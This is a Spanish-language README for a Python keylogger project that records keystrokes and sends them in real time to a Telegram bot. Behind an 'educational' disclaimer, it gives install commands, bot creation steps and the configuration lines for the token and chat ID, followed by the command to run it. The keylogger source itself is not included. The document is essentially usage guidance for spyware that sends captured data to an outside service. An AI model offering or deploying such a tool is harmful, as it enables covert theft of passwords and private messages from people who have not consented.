## Keylogger-Telegram-Edition
Este proyecto es un Keylogger educativo en Python, este registra las pulsaciones del teclado y las envía en tiempo real a Telegram mediante un bot.

> **Aviso:** Este es un proyecto desarrollado por bySofto con fines estrictamente educativos, de concienciación y sobre todo de investigación en ciberseguridad. Su objetivo es analizar el funcionamiento de los hooks de entrada y la detección defensiva de telemetría. El autor no se responsabiliza del uso indebido de este código en sistemas o redes sin autorización explícita.

## Requisitos

* Python 3.x
* Biblioteca `pynput`
* Biblioteca `python-telegram-bot`

## Instalación

1. Debes clonar este repositorio o descarga el archivo `Keylogger-bySofto.py`.
2. Instala las dependencias necesarias:

```bash
pip install pynput python-telegram-bot
```
## Configuración y Uso

1. Abre tu Telegram, luego busca `@BotFather` e inicia una conversación para crear un nuevo bot y obtener tu `api_token`.
2. Obtén tu `chat_id` personal (también puedes consultarlo con `@userinfobot`).
3. IMPORTANTE debes abrir el archivo `Keylogger-bySofto.py` y edita las siguientes líneas al final del código con tus datos:

```python
if __name__ == "__main__":
    api_token = 'TU_TOKEN_AQUI'
    chat_id = 'TU_CHAT_ID_AQUI'
    TelegramKeylogger(api_token, chat_id).start()
```
4. Ejecuta el script desde tu terminal
```bash
python Keylogger-bySofto.py
```
## Contacto y Soporte

Si tienes alguna duda o algún problema al ejecutar el proyecto, no dudes en contactar a uno de mis moderadores de Discord:

* **Discord:** https://bysofto.com/discord
